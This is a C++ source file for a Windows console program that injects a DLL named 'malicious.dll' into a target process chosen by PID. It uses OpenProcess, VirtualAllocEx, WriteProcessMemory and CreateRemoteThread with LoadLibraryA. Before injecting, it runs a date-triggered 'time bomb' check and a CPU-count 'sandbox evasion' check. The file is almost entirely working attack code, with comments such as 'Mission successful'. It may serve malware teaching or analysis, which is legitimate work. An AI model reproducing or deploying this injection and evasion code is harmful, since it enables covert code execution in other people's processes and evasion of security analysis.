// CRT-Injection.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "Windows.h"
#include "stdio.h"
#include <string>

int _tmain(int argc, _TCHAR* argv[])
{
	char* dllPath = "malicious.dll";

	/* 
	* Setup a Time Bomb
	*/
	_SYSTEMTIME lTime;
	GetLocalTime(&lTime);
	if (lTime.wYear == 2040)
	{
		if (lTime.wMonth == 11)
		{
			if (lTime.wDay == 10)
			{
				// Bomb is activated
			}
			else
			{
				exit(-1); // day is wrong
			}
		}
		else
		{
			exit(-1); // month is wrong
		}
	}
	else
	{
		exit(-1); // year is wrong
	}


	/*
	* Perform sandbox evasion
	*/
	SYSTEM_INFO sysinfo;
	GetSystemInfo(&sysinfo);
	int numCPU = sysinfo.dwNumberOfProcessors;
	if (numCPU >= 4)
	{
		// we can continue 
	}
	else
	{
		exit(-1);
	}


	/*
	* Access the target process whose PID is given in the args.
	*/
	if (argc != 2)
	{
		exit(-1); // PID is not given
	}
	int procID = std::stoi(argv[1]);
	HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procID);
	if (process == NULL)
	{
		exit(-1); // Could not open the process with given PID.
	}
	else
	{
		/*
		* Access the LoadLibrary function.
		*/
		LPVOID addr = (LPVOID)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
		if (addr == NULL)
		{
			exit(-1); // Could not load the LoadLibraryA function.
		}
		else
		{
			/*
			* Allocate memory in the target process.
			*/
			LPVOID arg = (LPVOID)VirtualAllocEx(process, NULL, strlen(dllPath), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
			if (arg == NULL)
			{
				exit(-1); // Allocation failed.
			}
			else
			{
				/*
				* Write the dll adress into the target process memory region.
				*/
				int n = WriteProcessMemory(process, arg, dllPath, strlen(dllPath), NULL);
				if (n == FALSE)
				{
					exit(-1); // Write failed.
				}
				else
				{
					/*
					* Inject the DLL into the target process.
					*/
					HANDLE threadID = CreateRemoteThread(process, NULL, 0, (LPTHREAD_START_ROUTINE)addr, arg, NULL, NULL);
					if (threadID == NULL) 
					{
						exit(-1); // Mission failed.
					}
					else
					{
						// Mission successful.
					}

					/*
					* Close the handle.
					*/
					CloseHandle(process);
				}
			}
		}
	}
	return 0;
}
